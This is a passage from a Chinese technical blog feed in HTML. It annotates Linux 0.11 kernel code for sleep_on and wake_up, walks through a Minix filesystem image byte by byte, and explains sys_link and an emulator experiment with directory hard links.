class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把当前任务置为不可中断的等待状态，并让睡眠队列指针指向当前任务。</span></span><br><span class="line"><span class="comment">// 只有明确的唤醒时才会返回。该函数提供了进程与中断处理程序之间的同步机制。函数参数P是等待</span></span><br><span class="line"><span class="comment">// 任务队列头指针。指针是含有一个变量地址的变量。这里参数p使用了指针的指针形式&#x27;**p&#x27;,这是因为</span></span><br><span class="line"><span class="comment">// C函数参数只能传值，没有直接的方式让被调用函数改变调用该函数程序中变量的值。但是指针&#x27;*p&#x27;</span></span><br><span class="line"><span class="comment">// 指向的目标(这里是任务结构)会改变，因此为了能修改调用该函数程序中原来就是指针的变量的值，</span></span><br><span class="line"><span class="comment">// 就需要传递指针&#x27;*p&#x27;的指针，即&#x27;**p&#x27;.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若指针无效，则退出。(指针所指向的对象可以是NULL，但指针本身不应该为0).另外，如果</span></span><br><span class="line">    <span class="comment">// 当前任务是任务0，则死机。因为任务0的运行不依赖自己的状态，所以内核代码把任务0置为</span></span><br><span class="line">    <span class="comment">// 睡眠状态毫无意义。</span></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">    <span class="comment">// 让tmp指向已经在等待队列上的任务(如果有的话)，例如inode-&gt;i_wait.并且将睡眠队列头的</span></span><br><span class="line">    <span class="comment">// 等等指针指向当前任务。这样就把当前任务插入到了*p的等待队列中。然后将当前任务置为</span></span><br><span class="line">    <span class="comment">// 不可中断的等待状态，并执行重新调度。</span></span><br><span class="line">tmp = *p;</span><br><span class="line">*p = current;</span><br><span class="line">current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">schedule();</span><br><span class="line">    <span class="comment">// 只有当这个等待任务被唤醒时，调度程序才又返回到这里，表示本进程已被明确的唤醒(就</span></span><br><span class="line">    <span class="comment">// 续态)。既然大家都在等待同样的资源，那么在资源可用时，就有必要唤醒所有等待该该资源</span></span><br><span class="line">    <span class="comment">// 的进程。该函数嵌套调用，也会嵌套唤醒所有等待该资源的进程。这里嵌套调用是指一个</span></span><br><span class="line">    <span class="comment">// 进程调用了sleep_on()后就会在该函数中被切换掉，控制权呗转移到其他进程中。此时若有</span></span><br><span class="line">    <span class="comment">// 进程也需要使用同一资源，那么也会使用同一个等待队列头指针作为参数调用sleep_on()函数，</span></span><br><span class="line">    <span class="comment">// 并且也会陷入该函数而不会返回。只有当内核某处代码以队列头指针作为参数wake_up了队列，</span></span><br><span class="line">    <span class="comment">// 那么当系统切换去执行头指针所指的进程A时，该进程才会继续执行下面的代码，把队列后一个</span></span><br><span class="line">    <span class="comment">// 进程B置位就绪状态(唤醒)。而当轮到B进程执行时，它也才可能继续执行下面的代码。若它</span></span><br><span class="line">    <span class="comment">// 后面还有等待的进程C，那它也会把C唤醒等。在这前面还应该添加一行：*p = tmp.</span></span><br><span class="line"><span class="keyword">if</span> (tmp)                    <span class="comment">// 若在其前还有存在的等待的任务，则也将其置为就绪状态(唤醒).</span></span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用此函数的地方一般是资源得不到满足(比如等待缓冲区解锁等场景)而致使自身任务运行到这里时候睡眠。但是等待这个资源的可能不止一个进程，一般管理缓冲的数据结构都会设置一个task_struct结构体指针表示当前正在等待本缓冲区的任务。但数据结构中并没有明显定义链表结构呀?注释里怎么说有呢?其实是”潜移默化”地保存在了各个任务的栈空间中去了。<br><img src="/images/Linux_0.11_schedule_sleep_on.png" alt="Linux_0.11_schedule_sleep_on.png"><br>内核代码首先定义一个tmp指针保存已经正在等待本资源的进程(假设叫A),然后将正在等待本资源的进程改变为当前进程(假设叫B)，并立即置B进程状态为不可中断地好唤醒，表示只能由wake_up函数来唤醒。之后便进行任务调度，因此B进程会”停止”在任务调度这里,因为如果没有被唤醒(即state置0)是不可能被调度的，调度算法只会选出”状态为0”的进程进行调度运行。假设另外一个进程(假设为C)也需要这个资源，代码也运行到这里(但是它们的进程上下文是不同的)，在C进程的栈空间定义一个tmp保存B进程的指针，把C自己的指针赋值到资源等待任务的指针位置，并启用任务调度，同样，C也会”停止”在这里。假设某个时候某个进程手动调用了wake_up函数。此时传递的指针居然是C进程(假设之后没有其他进程需要这个资源了)。好了，C被唤醒了，肯定优先于A和B运行了，貌似不太公平呀，”后来先到”。当调度程序检测到C处于可运行状态的时候并且它的优先级最高，便切换到C运行，而C会从schedule()函数这里继续向后运行，Linus原来的代码仅仅是将tmp任务(这里是B)唤醒，如果在这次之后没有其他任务来竞争这个资源，则也能顺利陆续唤醒(因为B运行完了也会执行到这里，B的tmp保存了A的任务指针…)。但是如果此时有一个任务D也来等待这个资源，D运行到tmp的时候tmp保存的居然还是C的任务指针(因为等待资源任务指针没有被更新)。之后运行完之后继续唤醒C(没啥用，C早就可运行，或者等待其他资源而阻塞，此时唤醒它将会打乱其所在队列…当然一般会有其他策略继续检测)。但是A和B不出意外就永远不能唤醒了。因此赵博士的注释要求增加一行代码<code>*p=tmp</code>，目的是刷新等待缓冲任务指针。(按照栈的意思也得有借有还吧，前面保存了之后也得会送回去呀)至于为什么Linux 0.11版本内核也看出什么大问题可能是由于”竞争”不够激烈，等待真正遇到业务场景复杂的时候弊端就暴露出来了，因此Linux内核版本一直在前进中。</p><p><img src="/images/Linux_0.11_schedule_list_table.png" alt="Linux_0.11_schedule_list_table.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 唤醒*p指向的让任务。*p是任务等待队列头指针。由于新等待任务是插入在等待队列头指针处的，</span></span><br><span class="line"><span class="comment">// 因此唤醒的是最后进入等待队列的任务。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p &amp;&amp; *p) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;          <span class="comment">// 置为就绪(可运行)状态TASK_RUNNING.</span></span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的源代码于interruptible_sleep_on函数。大体思路差不多，只不过此状态可被某些信号唤醒，不必要一定调用wake_up函数来置位。如注释所说，因此必须判断是否当前任务是否为等待头指针才能对头指针进行唤醒而自身又置为TASK_INTERRUPTIBLE状态并重新调度。(由于信号对其会产生影响而并不唯一是其他进程唤醒的)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 将当前任务置为可中断的等待状态，并放入*p指定的等待队列中。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interruptible_sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若指针无效，则退出。(指针所指向的对象可以是NULL，但指针本身不会为0).如果当前任务是</span></span><br><span class="line">    <span class="comment">// 任务0，则死机。</span></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">    <span class="comment">// 让tmp指向已经在等待队列上的任务(如果有的话)，例如inode-&gt;i_wait。并且将睡眠队列头的</span></span><br><span class="line">    <span class="comment">// 等待指针指向当前任务。这样就把当前任务插入到了*p的等待队列中。然后将当前任务置为可</span></span><br><span class="line">    <span class="comment">// 中断的等待状态，并执行重新调度。</span></span><br><span class="line">tmp=*p;</span><br><span class="line">*p=current;</span><br><span class="line">repeat:current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line">schedule();</span><br><span class="line">    <span class="comment">// 只有当这个等待任务被唤醒时，程序才又会回到这里，标志进程已被明确的唤醒执行。如果等待</span></span><br><span class="line">    <span class="comment">// 队列中还有等待任务，并且队列头指针所指向的任务不是当前任务时，则将该等待任务置为可运行</span></span><br><span class="line">    <span class="comment">// 的就绪状态，并重新执行调度程序。当指针*p所指向的不是当前任务时，表示在当前任务被被放入</span></span><br><span class="line">    <span class="comment">// 队列后，又有新的任务被插入等待队列前部。因此我们先唤醒他们，而让自己仍然等等。等待这些</span></span><br><span class="line">    <span class="comment">// 后续进入队列的任务被唤醒执行时来唤醒本任务。于是去执行重新调度。</span></span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; *p != current) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 下一句代码有误：应该是 *p = tmp, 让队列头指针指向其余等待任务，否则在当前任务之前插入</span></span><br><span class="line">    <span class="comment">// 等待队列的任务均被抹掉了。当然同时也需要删除下面行数中同样的语句</span></span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CS中学会抽象还是非常重要的，无处不在的数据结构:)</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;主要理解注释中提到的链表以及缺少几行代码的缘由&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="LDD" scheme="https://embpgp.github.io/tags/LDD/"/>
    
      <category term="Asm" scheme="https://embpgp.github.io/tags/Asm/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核0.11完全注释 来吧,Minix!</title>
    <link href="https://embpgp.github.io/2016/12/22/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E6%9D%A5%E5%90%A7-Minix/"/>
    <id>https://embpgp.github.io/2016/12/22/Linux内核0-11完全注释-来吧-Minix/</id>
    <published>2016-12-22T14:44:04.000Z</published>
    <updated>2025-03-11T12:14:38.963Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>认真学习Minix文件系统!通过一个实例手动分析Minix。具体源码实现由于考虑其他情况将很复杂。</p></blockquote><span id="more"></span><hr><h1 id="mkfs-a-minix"><a href="#mkfs-a-minix" class="headerlink" title="mkfs a minix"></a>mkfs a minix</h1><p>如下图所示,先不考虑什么是i节点等等，我们只需要知道目前手动创建了一个文件系统，大小为360KB,并且拷贝了一个hello.c文件到其根目录下。<br><img src="/images/Linux_0.11_Minix_mkfs_dev_fd1_360.png" alt="Linux_0.11_Minix_mkfs_dev_fd1_360.png"><br><img src="/images/Linux_0.11_Minix_mkfs_dev_fd1_360_do.png" alt="Linux_0.11_Minix_mkfs_dev_fd1_360_do.png"></p><h1 id="再来简介Minix文件系统格式"><a href="#再来简介Minix文件系统格式" class="headerlink" title="再来简介Minix文件系统格式"></a>再来简介Minix文件系统格式</h1><h2 id="引导块"><a href="#引导块" class="headerlink" title="引导块"></a>引导块</h2><p>根据Minix文件系统的设计，我们上面创建的360KB的软盘总共分为6个部分，图中的块是以1KB为单位的，这是设计需求，注意区别于硬盘中的扇区。其中约定第一个块为引导块，虽然引导区约定为512字节但是在这里最小单位为1K,浪费也就不在乎了。即使不引导也得有引导标志以符合标准。<br><img src="/images/Linux_0.11_Minix_360K_fd_layout.png" alt="Linux_0.11_Minix_360K_fd_layout.png"></p><ul><li>注意0x200偏移前面的0xaa55。<br><img src="/images/Linux_0.11_Minix_360K_Boot.png" alt="Linux_0.11_Minix_360K_Boot.png"><h2 id="超级块"><a href="#超级块" class="headerlink" title="超级块"></a>超级块</h2>仅仅知道这是一块可用的软盘还是不够的，必须还得知道到底我们需要的数据存在什么地方。因此Minix文件系统在设计的时候用一个数据结构来描述整个可用设备的具体情况。<br><img src="/images/Linux_0.11_Minix_360K_super_block.png" alt="Linux_0.11_Minix_360K_super_block.png"><br>为什么要分内存中字段和磁盘中字段呢?本应该磁盘中存储这些数据结构是够了，但是操作系统为了更快更好地管理文件系统便用”以空间来换时间”的思想来操作数据。下面继续分析我们自己创建的360KB的软盘。在bochs终端键入<code>hexdump /dev/fd1 | more</code>。加more是由于终端不支持拉屏只能一帧帧看了。我们按空格键快速定位到偏移0x400。刚好是1KB后的块，即第1个块(引导区约定为0块)。对照着上面的数据结构照葫芦画瓢来解析各个字段(注意intel小端格式的显示)。</li><li>0x0078 short 16位 对应文件系统中i节点总数目 十进制为120 刚好对应创建文件系统的时候显示的结果。</li><li>0x0168 short 16位 逻辑块的数目　十进制为360 实质上在Minix 1.0设计的时候逻辑块大小等于磁盘块大小</li><li>0x0001 short 16位 i节点位图占块数目　1表示仅仅用一个块就可以描述所有i就节点映射情况</li><li>0x0001 short 16位 逻辑块位图占块数目 同上</li><li>0x0008　short 16位 表示数据区第一个块号 真正保存文件内容的块区</li><li>0x0000 short 16位 在Minix 1.0中恒等于0，为后期改版做准备。</li><li>0x10081c00 long 32位 最大文件长度，书中注释到”显然有误”,此字段应该是mkfs程序填充的，但是后面学习了i节点后进过计算个人认为没有那么”显然”,mkfs程序仅仅是用双重间接块号来计算的，即512*512*1KB = 256MB=268966912=0x10081c00字节。但是实际情况是可以再存多一点的。加上前面的直接块号和一次间接块号。但是从内存字段的定义来看答案又不一样…(不触碰原则就没事儿,灵活点儿)</li><li>0x137f short 16位 Magic Number　约定值，类似于本版本文件系统的标志。<br><img src="/images/Linux_0.11_Minix_360K_super_block_data.png" alt="Linux_0.11_Minix_360K_super_block_data.png"></li><li>关于内存中的字段含义参见原书或者Minix文件系统原理，对照着功能实现源码分析更好。</li><li>超级块在内核初始化的时候会被加载并分析，主要是为了加载根文件系统，或者mount其他文件系统和设备。</li></ul><h2 id="i节点位图和逻辑块位图"><a href="#i节点位图和逻辑块位图" class="headerlink" title="i节点位图和逻辑块位图"></a>i节点位图和逻辑块位图</h2><p>图中偏移量0x800和0xc00分别表示，均为0x0007,表示有三个块被占用，当然约定第0比特不能用，直接被设置为1。所以文件系统中有两个块被使用。</p><h2 id="i节点"><a href="#i节点" class="headerlink" title="i节点"></a>i节点</h2><p>文件系统中最重要的数据结构!!!和超级块类似，磁盘中仅仅保存最精简的字段，内存中其他字段将经常被使用。<br><img src="/images/Linux_0.11_Minix_1.0_inode_struct.png" alt="Linux_0.11_Minix_1.0_inode_struct.png"><br>看下图我们开始时候创建的360KB的软盘。<br><img src="/images/Linux_0.11_Minix_1.0_inode_struct_do.png" alt="Linux_0.11_Minix_1.0_inode_struct_do.png"><br>继续照葫芦画瓢~由上述定义可以知道,inode在磁盘空间大小为32字节，所以一个块(1024字节)能够存1024/32=32个数据结构，因此4个块就刚好是128个i节点。其中的4是块4、5、6、7。块0引导,块1为super_block。块2、3分别是位图。块8就是真正的数据部分了。找到偏移为0x1000(第4块)。</p><ul><li>0x41ed 表示目录文件权限为755。</li><li>0x0000 表示uid为0，即root用户</li><li>0x00000030 表示文件长度为0x30</li><li>0x585d223b 时间戳</li><li>0x00 gid为0,表示root用户组</li><li>0x02 链接数</li><li>0x08　数据区域的第一个块位置，后续均为0表示没有更多数据块了。<br><img src="/images/Linux_0.11_Minix_1.0_inode_struct_imode.png" alt="Linux_0.11_Minix_1.0_inode_struct_imode.png"><br>我们根据目录项的数据结构定义跳到第8块逻辑块继续追踪。即偏移量为0x2000处。</li><li>第一项</li><li>0x0001 为i节点号(刚刚才跳过来的地方)</li><li>0x2e 即为’.’，表示当前目录</li><li>第二项</li><li>0x0001 为i节点号</li><li>0x2e2e 即为”..”，表示上层目录，因为这是根目录，因此”..”=”.”</li><li>第三项</li><li>0x0002 为i节点号(待会儿分析）</li><li>一波ascii码，表示”hello.c”</li></ul><p>关于如何根据文件名称定位一个具体文件算法可以参见源码，原理参见书。<br><img src="/images/Linux_0.11_Minix_1.0_dir_entry_struct.png" alt="Linux_0.11_Minix_1.0_dir_entry_struct.png"></p><p>然后接着上面把hello.c文件也分析一下,如果已经定位了到刚刚的第三项，根据inode为2定位到其inode数据结构。</p><ul><li>0x8180 表示普通文件权限为600,注意文件类型定义为8进制数</li><li>0x0000 root</li><li>0x0000004a 表示文件大小为74字节</li><li>0x585d223b 时间戳</li><li>0x01 链接数</li><li>0x00 root</li><li>0x09 数据部分第一个块区，内容不多因此一个块足够。</li></ul><p>定位到偏移量为0x2400处，将这一大串ascii码翻译过来就是hello.c文件的具体内容。</p><h1 id="定位文件基本原理"><a href="#定位文件基本原理" class="headerlink" title="定位文件基本原理"></a>定位文件基本原理</h1><p><img src="/images/Linux_0.11_Minix_1.0_find_file_by_name.png" alt="Linux_0.11_Minix_1.0_find_file_by_name.png"><br><img src="/images/Linux_0.11_Minix_1.0_find_file_by_name_words.png" alt="Linux_0.11_Minix_1.0_find_file_by_name_words.png"></p><blockquote><p>现在来分析为什么说硬链接不能是目录以及不能跨文件系统而软链接就可以呢…</p></blockquote><h1 id="sys-link系统调用"><a href="#sys-link系统调用" class="headerlink" title="sys_link系统调用"></a>sys_link系统调用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//// 为文件建立一个文件名目录项</span></span><br><span class="line"><span class="comment">// 为一个已存在的文件创建一个新链接(也称为硬链接 - hard link)</span></span><br><span class="line"><span class="comment">// 参数：oldname - 原路径名；newname - 新的路径名</span></span><br><span class="line"><span class="comment">// 返回：若成功则返回0，否则返回出错号。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_link</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * oldname, <span class="keyword">const</span> <span class="keyword">char</span> * newname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> * <span class="title">de</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">oldinode</span>, * <span class="title">dir</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * basename;</span><br><span class="line"><span class="keyword">int</span> namelen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先对原文件名进行有效性验证，它应该存在并且不是一个目录名。所以我们先取得原文件</span></span><br><span class="line">    <span class="comment">// 路径名对应的i节点oldnode.若果为0，则表示出错，返回出错号。若果原路径名对应的是</span></span><br><span class="line">    <span class="comment">// 一个目录名，则放回该i节点，也返回出错号。</span></span><br><span class="line">oldinode=namei(oldname);</span><br><span class="line"><span class="keyword">if</span> (!oldinode)</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (S_ISDIR(oldinode-&gt;i_mode)) &#123;</span><br><span class="line">iput(oldinode);</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 然后查找新路径名的最顶层目录的i节点dir，并返回最后的文件名及其长度。如果目录的</span></span><br><span class="line">    <span class="comment">// i节点没有找到，则放回原路径名的i节点，返回出错号。如果新路径名中不包括文件名，</span></span><br><span class="line">    <span class="comment">// 则放回原路径名i节点和新路径名目录的i节点，返回出错号。</span></span><br><span class="line">dir = dir_namei(newname,&amp;namelen,&amp;basename);</span><br><span class="line"><span class="keyword">if</span> (!dir) &#123;</span><br><span class="line">iput(oldinode);</span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!namelen) &#123;</span><br><span class="line">iput(oldinode);</span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 我们不能跨设备建立硬链接。因此如果新路径名顶层目录的设备号与原路径名的设备号不</span></span><br><span class="line">    <span class="comment">// 一样，则放回新路径名目录的i节点和原路径名的i节点，返回出错号。另外，如果用户没</span></span><br><span class="line">    <span class="comment">// 有在新目录中写的权限，则也不能建立连接，于是放回新路径名目录的i节点和原路径名</span></span><br><span class="line">    <span class="comment">// 的i节点，返回出错号。</span></span><br><span class="line"><span class="keyword">if</span> (dir-&gt;i_dev != oldinode-&gt;i_dev) &#123;</span><br><span class="line">iput(dir);</span><br><span class="line">iput(oldinode);</span><br><span class="line"><span class="keyword">return</span> -EXDEV;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!permission(dir,MAY_WRITE)) &#123;</span><br><span class="line">iput(dir);</span><br><span class="line">iput(oldinode);</span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 现在查询该新路径名是否已经存在，如果存在则也不能建立链接。于是释放包含该已存在</span></span><br><span class="line">    <span class="comment">// 目录项的高速缓冲块，放回新路径名目录的i节点和原路径名的i节点，返回出错号。</span></span><br><span class="line">bh = find_entry(&amp;dir,basename,namelen,&amp;de);</span><br><span class="line"><span class="keyword">if</span> (bh) &#123;</span><br><span class="line">brelse(bh);</span><br><span class="line">iput(dir);</span><br><span class="line">iput(oldinode);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 现在所有条件都满足了，于是我们在新目录中添加一个目录项。若失败则放回该目录的</span></span><br><span class="line">    <span class="comment">// i节点和原路径名的i节点，返回出错号。否则初始设置该目录项的i节点号等于原路径名的</span></span><br><span class="line">    <span class="comment">// i节点号，并置包含该新添加目录项的缓冲块已修改标志，释放该缓冲块，放回目录的i节点。</span></span><br><span class="line">bh = add_entry(dir,basename,namelen,&amp;de);</span><br><span class="line"><span class="keyword">if</span> (!bh) &#123;</span><br><span class="line">iput(dir);</span><br><span class="line">iput(oldinode);</span><br><span class="line"><span class="keyword">return</span> -ENOSPC;</span><br><span class="line">&#125;</span><br><span class="line">de-&gt;inode = oldinode-&gt;i_num;</span><br><span class="line">bh-&gt;b_dirt = <span class="number">1</span>;</span><br><span class="line">brelse(bh);</span><br><span class="line">iput(dir);</span><br><span class="line">    <span class="comment">// 再将原节点的链接计数加1，修改其改变时间为当前时间，并设置i节点已修改标志。最后</span></span><br><span class="line">    <span class="comment">// 放回原路径名的i节点，并返回0（成功）。</span></span><br><span class="line">oldinode-&gt;i_nlinks++;</span><br><span class="line">oldinode-&gt;i_ctime = CURRENT_TIME;</span><br><span class="line">oldinode-&gt;i_dirt = <span class="number">1</span>;</span><br><span class="line">iput(oldinode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>根据源代码分析程序首先获取源(old)文件inode，如果不存在就直接返回了，如果存在则继续判断是否为目录，如果是则放回inode并返回。那么到这里几乎就可以回答为什么不能为目录了(因为源码实现不允许呀),但是仍然要刨根问底，假定有”开发者”绕过了这么策略操作系统将如何处理呢?先继续看。</li><li>之后就是检查目的(new)文件的顶层目录权限了，如果没问题将继续往下走</li><li>再后就是说的不能进行跨文件系统的硬链接…</li><li>如果没问题的话就在目的文件的目录下建立一个链接文件–&gt;本质上仅仅在其目录下新增了一个dir_entry结构体并使得其inode字段指向源文件m_inode的i_num字段,将inode的i_nlinkds字段++。</li><li>现在我们假设某”开发者”先绕过这个检查策略(自己修改这段源码然后创建目录硬链接或者二进制大牛自己手动输入都可)，看程序会发生什么…</li></ul><ul><li><p>可以看到至少shell是不允许我们创建的<br><img src="/images/Linux_0.11_fs_hard_links_not_allow.png" alt="Linux_0.11_fs_hard_links_not_allow.png"></p></li><li><p>开始建立一些测试文件,由于忘了linux 0.11版本仅仅允许最多14个字符的文件名字，导致有些名字不全。删除也出类似前面的问题，说不是owner。在写下这段文字之前我做的测试成功了但我自己建立的是根目录的硬链接，导致切换新的内核rm的时候把根文件系统删掉了。。。又重新复制了一个hdc文件过来。<br>图中的<code>dir_for_hard_l</code>(其实是dir_for_hard_link)是我们想要链接的目录(为了保险起见了，怕忘了又把根目录删了…)。<code>hard_link_not_</code>是C语言源程序，但是gcc编译的时候报错，因此我重定向了一个短的.c文件。<br><img src="/images/linux_0.11_fs_usr_root_dir.png" alt="linux_0.11_fs_usr_root_dir.png"></p></li><li><p>用来测试没有修改内核代码的时候能否创建目录硬链接。为了简单我也没有检测main函数的具体参数合法性了。看结果没有创建成功，而返回值-1恰恰是宏定义EPERM的负数，说明内核检测到了目录问题。<br><img src="/images/linux_0.11_fs_hard_link_not_allow.png" alt="linux_0.11_fs_hard_link_not_allow.png"></p></li><li><p>我修改了这段代码，然后重新编译内核代码看看吧。<br><img src="/images/linux_0.11_fs_hard_link_allow_codes.png" alt="linux_0.11_fs_hard_link_allow_codes.png"></p></li><li><p>用bash修改失败了，猜测在bash的实现中提前加入了检测，我们用C语言来就成功了。可以看到确实可以创建硬链接的，在这种情况下也没有出问题。<br><img src="/images/linux_0.11_fs_hard_link_allow_test.png" alt="linux_0.11_fs_hard_link_allow_test.png"><br><img src="/images/linux_0.11_fs_hard_link_allow_new_file.png" alt="linux_0.11_fs_hard_link_allow_new_file.png"></p></li></ul><ul><li><p>为了建立”有向循环图”测试之后删除的时候又把文件系统给删了…</p></li><li><p>以下为bash自带bc计算器快速进制转换命令，可以结合hexdump用于自己计算inode偏移自己解析数据结构啥的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span 